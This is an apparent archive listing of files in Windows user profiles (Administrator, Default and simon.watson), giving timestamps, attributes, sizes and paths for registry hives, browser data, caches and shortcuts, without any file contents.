2025-02-16 10:49:06 ...SA            0            0  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/57C8EDB95DF3F0AD4EE2DC2B8CFD4157
2025-02-16 10:48:49 ...SA            0            0  Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/AppContainerUserCertRead
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Documents.mydocs
2021-05-08 08:06:51 ..HSA            0            0  Default/NTUSER.DAT.LOG1
2025-02-16 11:15:52 ..HSA            0            0  simon.watson/ntuser.dat.LOG2
2021-05-08 08:18:31 ..HSA          174          174  desktop.ini
2025-02-16 10:48:46 ..HSA       201728        54000  Administrator/ntuser.dat.LOG2
2025-02-16 10:58:11 ..HSA        65536         1372  Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 11:16:07 ..H.A       786432       159999  Administrator/NTUSER.DAT
2025-02-16 10:48:46 ..HSA       524288         4309  Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 10:48:46 ..HSA       524288         4268  Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbres00001.jrs
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbres00002.jrs
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbtmp.log
2025-02-16 10:48:46 ..HSA       524288         4268  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 10:48:48 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Windows/WebCache/V01res00001.jrs
2025-02-16 10:48:48 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Windows/WebCache/V01res00002.jrs
2025-02-16 10:48:48 ....A       524288         4268  Administrator/AppData/Local/Microsoft/Windows/WebCache/V01tmp.log
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbres00001.jrs
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbres00002.jrs
2025-02-16 10:52:22 ....A       524288         4268  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbtmp.log
2025-02-16 19:48:13 ..HSA       524288         4268  Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 11:15:52 ..HSA       524288         4268  simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 11:15:52 ..HSA       524288         4268  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TMContainer00000000000000000002.regtrans-ms
2025-02-16 10:48:46 ..HS.           20           20  Administrator/ntuser.ini
2025-02-16 11:15:52 ..HS.           20           20  simon.watson/ntuser.ini
2025-02-16 10:48:48 ..HSA          298          298  Administrator/3D Objects/desktop.ini
2025-02-16 11:14:06 ..H.A         7404         1199  Administrator/AppData/Local/IconCache.db
2025-02-16 11:17:05 ....A         4347         1397  Administrator/AppData/Local/ConnectedDevicesPlatform/CDPGlobalSettings.cdp
2025-02-16 10:48:47 ....A          654          633  Administrator/AppData/Local/ConnectedDevicesPlatform/Connected Devices Platform certificates.sst
2025-02-16 11:17:04 ....A           54           54  Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator.cdpresource
2025-02-16 11:17:06 ....A          986          591  Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator.cdp
2025-02-16 11:17:06 ....A        32768          279  Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db-shm
2025-02-16 11:04:12 ....A      1048576        12399  Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db
2025-02-16 10:48:48 ..HSA        11136        11136  Administrator/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
2025-02-16 10:48:49 ....A           11           11  Administrator/AppData/Local/Microsoft/Edge/User Data/Last Version
2025-02-16 10:48:49 ....A      1048576         8876  Administrator/AppData/Local/Microsoft/Edge/User Data/CrashpadMetrics-active.pma
2025-02-16 10:48:49 ....A         2791         1597  Administrator/AppData/Local/Microsoft/Edge/User Data/Local State
2025-02-16 10:48:49 ....A          152          152  Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/settings.dat
2025-02-16 10:48:49 ....A           20           20  Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/throttle_store.dat
2025-02-16 10:48:49 ....A        71757        47593  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Edge Profile.ico
2025-02-16 10:48:49 ....A        20480          815  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Favicons
2025-02-16 10:48:49 ....A       118784         2610  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/History
2025-02-16 10:48:49 ....A        40960         1703  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Login Data
2025-02-16 10:48:49 ....A       139264         3311  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Media History
2025-02-16 10:48:49 ....A         2904         1583  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Preferences
2025-02-16 10:48:49 ....A          182          182  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/README
2025-02-16 10:48:49 ....A        26282         9182  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Secure Preferences
2025-02-16 10:48:49 ....A      4194304        44869  Administrator/AppData/Local/Microsoft/Edge/User Data/BrowserMetrics/BrowserMetrics-67B1C291-7C8.pma
2025-02-16 10:48:49 ....A           24           24  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/js/index
2025-02-16 10:48:49 ....A           24           24  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/wasm/index
2025-02-16 10:48:49 ....A           16           16  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/CURRENT
2025-02-16 10:48:49 ....A           16           16  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/CURRENT
2025-02-16 10:48:49 ....A           16           16  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/CURRENT
2025-02-16 10:48:49 ....A        92160         3537  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Web Data
2025-02-16 10:48:49 ....A          153          153  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/LOG
2025-02-16 10:48:49 ....A           41           41  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/MANIFEST-000001
2025-02-16 10:48:49 ....A           41           41  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/MANIFEST-000001
2025-02-16 10:48:49 ....A           41           41  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/MANIFEST-000001
2025-02-16 10:48:49 ....A           40           40  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/000003.log
2025-02-16 10:48:49 ....A          161          161  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/LOG
2025-02-16 10:48:49 ....A           84           84  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/000003.log
2025-02-16 10:48:49 ....A          149          149  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/LOG
2025-02-16 10:48:49 ....A         8192          267  Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_0
2025-02-16 10:48:49 ....A         8192          267  Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_2
2025-02-16 10:49:00 ....A       270336         2421  Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_1
2025-02-16 10:48:49 ....A         8192          269  Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_3
2025-02-16 10:48:49 ....A          184          184  Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/cache
2025-02-16 10:48:49 ....A          184          184  Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/download_cache
2025-02-16 10:48:49 ....A       262512         2413  Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/index
2025-02-16 10:48:49 ....A           72           72  Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/warnStateCache
2025-02-16 10:48:48 ....A         6503         1610  Administrator/AppData/Local/Microsoft/Internet Explorer/brndlog.bak
2025-02-16 11:10:30 ....A         4305         1212  Administrator/AppData/Local/Microsoft/Internet Explorer/brndlog.txt
2025-02-16 11:10:35 ....A          710          355  Administrator/AppData/Local/Microsoft/Internet Explorer/ie4uinit-ClearIconCache.log
2025-02-16 11:10:30 ....A         2724          616  Administrator/AppData/Local/Microsoft/Internet Explorer/ie4uinit-UserConfig.log
2025-02-16 11:17:32 ....A         8192          371  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edb.chk
2025-02-16 11:17:31 ....A       524288        14237  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edb.log
2025-02-16 11:10:30 ....A         3050         1045  Administrator/AppData/Local/Microsoft/Internet Explorer/IECompatData/iecompatdata.xml
2025-02-16 10:48:48 ....A         1044          587  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/01_Music_auto_rated_at_5_stars.wpl
2025-02-16 10:48:48 ....A         1279          599  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/02_Music_added_in_the_last_month.wpl
2025-02-16 10:48:48 ....A         1267          593  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/03_Music_rated_at_4_or_5_stars.wpl
2025-02-16 10:48:48 ....A         1284          603  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/04_Music_played_in_the_last_month.wpl
2025-02-16 10:48:48 ....A          797          560  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/05_Pictures_taken_in_the_last_month.wpl
2025-02-16 10:48:48 ....A          785          552  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/06_Pictures_rated_4_or_5_stars.wpl
2025-02-16 10:48:48 ....A         1040          592  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/07_TV_recorded_in_the_last_week.wpl
2025-02-16 10:48:48 ....A         1020          584  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/08_Video_rated_at_4_or_5_stars.wpl
2025-02-16 10:48:48 ....A         1025          575  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/09_Music_played_the_most.wpl
2025-02-16 10:48:48 ....A         1063          570  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/10_All_Music.wpl
2025-02-16 10:48:48 ....A         1079          603  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/12_All_Video.wpl
2025-02-16 10:48:48 ....A          585          499  Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/11_All_Pictures.wpl
2025-02-16 11:16:07 ....A         1022          463  Administrator/AppData/Local/Microsoft/PenWorkspace/DiscoverCacheData.dat
2025-02-16 10:48:47 ....A          436          436  Administrator/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/Policy.vpol
2025-02-16 10:48:46 ..HSA       439296        93279  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
2025-02-16 10:48:46 ..HSA       323584        67891  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
2025-02-16 10:58:11 ..HSA        65536         1442  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TM.blf
2025-02-16 11:16:07 ..H.A      1572864       306904  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat
2025-02-16 10:48:46 ..HSA       524288         4309  Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 10:48:48 ..HS.          174          174  Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini
2025-02-16 10:48:53 ..HS.          174          174  Administrator/AppData/Local/Microsoft/Windows/Burn/Burn/desktop.ini
2025-02-16 11:16:06 ....A        16384         1003  Administrator/AppData/Local/Microsoft/Windows/Caches/cversions.1.db
2025-02-16 10:48:48 ....A        16384         1028  Administrator/AppData/Local/Microsoft/Windows/Caches/cversions.3.db
2025-02-16 11:10:36 ....A       424337       125879  Administrator/AppData/Local/Microsoft/Windows/1033/StructuredQuerySchema.bin
2025-02-16 11:10:41 ....A        71840        14632  Administrator/AppData/Local/Microsoft/Windows/Caches/{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000006.db
2025-02-16 11:16:06 ....A       204112         2424  Administrator/AppData/Local/Microsoft/Windows/Caches/{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db
2025-02-16 11:10:46 ....A       424376       125907  Administrator/AppData/Local/Microsoft/Windows/Caches/{0BDE7B0F-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_1280.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_1280.db
2025-02-16 10:48:53 ....A       368640        58961  Administrator/AppData/Local/Microsoft/Windows/Explorer/ExplorerStartupLog.etl
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_1920.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_1920.db
2025-02-16 11:10:31 ....A      1048576        50749  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_16.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_2560.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_2560.db
2025-02-16 11:10:47 ....A      1048576        27041  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_256.db
2025-02-16 10:59:25 ....A      1048576       124819  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_32.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_768.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_768.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_96.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_96.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_custom_stream.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_custom_stream.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_exif.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_exif.db
2025-02-16 11:15:11 ....A        14688         2158  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_idx.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_sr.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_sr.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_wide.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_wide.db
2025-02-16 10:59:25 ....A      1048576       118939  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_48.db
2025-02-16 10:59:25 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_wide_alternate.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_wide_alternate.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_256.db
2025-02-16 10:48:50 ....A      1048576         9228  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_16.db
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_48.db
2025-02-16 10:48:50 ....A         7416          326  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_idx.db
2025-02-16 10:48:50 ....A      1048576        10728  Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_32.db
2025-02-16 11:18:05 ....A          130          130  Administrator/AppData/Local/Microsoft/Windows/History/desktop.ini
2025-02-16 11:17:04 ....A        32768          511  Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db-shm
2025-02-16 11:22:14 ....A       189552        48718  Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db-wal
2025-02-16 11:16:07 ....A      1048576        60267  Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db
2025-02-16 10:48:50 ....A           52           52  Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote/script
2025-02-16 10:48:50 ....A        31162         6959  Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote/script_96032244749497702726114603847611723578.rel.v2
2021-05-08 08:18:31 ....A        63955        20467  Administrator/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml
2025-02-16 11:16:07 ....A         8192          357  Administrator/AppData/Local/Microsoft/Windows/WebCache/V01.chk
2025-02-16 11:16:07 ....A       524288       108416  Administrator/AppData/Local/Microsoft/Windows/WebCache/V01.log
2025-02-16 11:16:07 ....A        16384          360  Administrator/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.jfm
2021-05-08 08:14:58 ....A         1109          450  Administrator/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk
2021-05-08 08:14:58 ....A         1109          450  Default/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk
2021-05-08 08:14:58 ....A         1109          450  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk
2021-05-08 08:18:35 ..HSA           75           75  Administrator/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini
2021-05-08 08:18:35 ..HSA           75           75  Default/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini
2021-05-08 08:18:35 ..HSA           75           75  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini
2021-05-08 08:14:58 ....A         1109          454  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk
2021-05-08 08:14:58 ....A         1109          454  Default/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk
2021-05-08 08:14:58 ....A         1109          454  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk
2021-05-08 08:14:58 ....A         1109          454  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk
2021-05-08 08:14:58 ....A         1109          454  Default/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk
2021-05-08 08:14:58 ....A         1109          454  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk
2021-05-08 08:14:58 ....A         1109          452  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk
2021-05-08 08:14:58 ....A         1109          452  Default/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk
2021-05-08 08:14:58 ....A         1109          452  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk
2021-05-08 08:14:58 ....A         1492          806  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk
2021-05-08 08:14:58 ....A         1492          806  Default/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk
2021-05-08 08:14:58 ....A         1492          806  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk
2021-05-08 08:14:58 ....A         1021          421  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk
2021-05-08 08:14:58 ....A         1021          421  Default/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk
2021-05-08 08:14:58 ....A         1021          421  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk
2021-05-08 08:18:35 ..HSA          325          325  Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini
2021-05-08 08:18:35 ..HSA          325          325  Default/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini
2021-05-08 08:18:35 ..HSA          325          325  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini
2021-05-08 08:14:58 ....A         1015          409  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1015          409  Default/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1015          409  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1127          458  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1127          458  Default/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1127          458  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1059          431  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1059          431  Default/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1059          431  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk
2021-05-08 08:14:58 ....A         1171          482  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1171          482  Default/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1171          482  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk
2021-05-08 08:14:58 ....A         1015          417  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk
2021-05-08 08:14:58 ....A         1015          417  Default/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk
2021-05-08 08:14:58 ....A         1015          417  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk
2021-05-08 08:14:58 ....A         1015          416  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk
2021-05-08 08:14:58 ....A         1015          416  Default/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk
2021-05-08 08:14:58 ....A         1015          416  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk
2021-05-08 08:14:58 ....A         1582          834  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk
2021-05-08 08:14:58 ....A         1582          834  Default/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk
2021-05-08 08:14:58 ....A         1582          834  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk
2021-05-08 08:14:58 ....A         1075          453  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk
2021-05-08 08:14:58 ....A         1075          453  Default/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk
2021-05-08 08:14:58 ....A         1075          453  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk
2021-05-08 08:14:58 ....A         1576          837  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk
2021-05-08 08:14:58 ....A         1576          837  Default/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk
2021-05-08 08:14:58 ....A         1576          837  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk
2021-05-08 08:14:58 ....A         1015          417  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk
2021-05-08 08:14:58 ....A         1015          417  Default/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk
2021-05-08 08:14:58 ....A         1015          417  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk
2021-05-08 08:14:58 ....A         1578          839  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk
2021-05-08 08:14:58 ....A         1578          839  Default/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk
2021-05-08 08:14:58 ....A         1578          839  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk
2021-05-08 08:14:58 ....A         1015          415  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk
2021-05-08 08:14:58 ....A         1015          415  Default/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk
2021-05-08 08:14:58 ....A         1015          415  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk
2021-05-08 08:14:58 ....A         1578          839  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk
2021-05-08 08:14:58 ....A         1578          839  Default/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk
2021-05-08 08:14:58 ....A         1578          839  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk
2021-05-08 08:18:35 ..HSA          941          529  Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini
2021-05-08 08:18:35 ..HSA          941          529  Default/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini
2021-05-08 08:18:35 ..HSA          941          529  simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini
2021-05-08 08:18:31 ....A           80           80  Administrator/AppData/Local/Microsoft/Windows Sidebar/settings.ini
2021-05-08 08:18:31 ....A           80           80  Default/AppData/Local/Microsoft/Windows Sidebar/settings.ini
2021-05-08 08:18:31 ....A           80           80  simon.watson/AppData/Local/Microsoft/Windows Sidebar/settings.ini
2025-02-16 11:18:27 ....A         6041         1751  Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj/10.0.0.0/user.config
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings/settings.dat
